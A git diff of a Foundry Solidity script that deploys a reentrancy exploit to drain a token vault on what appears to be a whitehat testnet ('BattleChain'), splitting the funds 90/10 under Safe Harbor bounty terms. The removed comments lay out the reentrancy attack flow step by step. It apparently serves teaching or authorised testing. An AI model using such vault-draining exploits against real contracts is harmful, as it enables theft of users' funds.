@@ -3,56 +3,42 @@ pragma solidity ^0.8.24;
 
 import {Script, console} from "forge-std/Script.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {Attacker} from "../src/Attacker.sol";
+import {Exploit} from "../src/Exploit.sol";
 
-/// @notice
-///         The attack flow:
-///           1. Register a transfer hook on MockToken so this contract gets a callback on receive
-///           2. Deposit seed tokens to establish a non-zero balance in the vault
-///           3. Call withdrawAll() — vault transfers tokens, triggering our hook
-///           4. Inside onTokenTransfer(), call withdrawAll() again (balance still non-zero)
-///           5. Repeat until the vault is empty
-///           6. You're on BattleChain — split the haul per Safe Harbor terms and walk away clean
+/// @notice Step 5 (Whitehat): Deploy the Exploit — a SINGLE transaction that approves
+/// attack mode (via the permissionless testnet moderator) and drains the vault via
+/// reentrancy, then splits the proceeds per Safe Harbor terms (90% back, 10% bounty).
 ///
 /// Prerequisites — set in .env:
-///   TOKEN_ADDRESS, VAULT_ADDRESS, RECOVERY_ADDRESS
+///   VAULT_ADDRESS, TOKEN_ADDRESS, RECOVERY_ADDRESS, AGREEMENT_ADDRESS
 ///
 /// Usage:
-///   forge script script/Attack.s.sol --rpc-url battlechain --broadcast
+///   just attack            # keystore
+///   just attack-browser    # your own wallet (MetaMask/Trezor)
 contract Attack is Script {
-    uint256 constant SEED_AMOUNT = 100e18; // enough to open a position — the vault does the rest
-    uint256 constant BOUNTY_BPS = 1_000; // 10% — as agreed in the Safe Harbor terms
+    address constant MOCK_REGISTRY_MODERATOR = 0x3DdA228A38b4d7438bBF5D5137c8D1090DcaF6bF;
 
     function run() external {
-        address attackerAddr = vm.envAddress("SENDER_ADDRESS");
-        address token        = vm.envAddress("TOKEN_ADDRESS");
         address vault = vm.envAddress("VAULT_ADDRESS");
-        address recoveryAddress = vm.envAddress("RECOVERY_ADDRESS");
+        address token = vm.envAddress("TOKEN_ADDRESS");
+        address recovery = vm.envAddress("RECOVERY_ADDRESS");
+        address agreement = vm.envAddress("AGREEMENT_ADDRESS");
 
         uint256 vaultBefore = IERC20(token).balanceOf(vault);
         console.log("Vault balance before:", vaultBefore / 1e18, "tokens");
-        console.log("Deploying attacker...");
+        console.log("Deploying Exploit (approves attack mode + drains in one tx)...");
 
-        vm.startBroadcast(attackerAddr);
-
-        // Deploy the attacker — pointed at the vault, armed with bounty terms
-        Attacker attacker = new Attacker(vault, token, recoveryAddress, BOUNTY_BPS);
-
-        // Pull the trigger. One hook registration, one deposit, one withdrawal —
-        // the vault's own logic does the rest.
-        attacker.attack(SEED_AMOUNT);
-
+        vm.startBroadcast();
+        new Exploit(vault, recovery, agreement, MOCK_REGISTRY_MODERATOR);
         vm.stopBroadcast();
 
-        // Tally the damage
         uint256 vaultAfter = IERC20(token).balanceOf(vault);
-        uint256 bounty = IERC20(token).balanceOf(attackerAddr);
-        uint256 returned = IERC20(token).balanceOf(recoveryAddress);
+        uint256 returned = IERC20(token).balanceOf(recovery);
 
         console.log("\n--- Vault drained ---");
         console.log("Vault before:      ", vaultBefore / 1e18, "tokens");
         console.log("Vault after:       ", vaultAfter / 1e18, "tokens");
-        console.log("Bounty kept:       ", bounty / 1e18, "tokens");
         console.log("Returned to protocol:", returned / 1e18, "tokens");
+        console.log("(The 10%% bounty went to the wallet that deployed the Exploit.)");
     }
 }
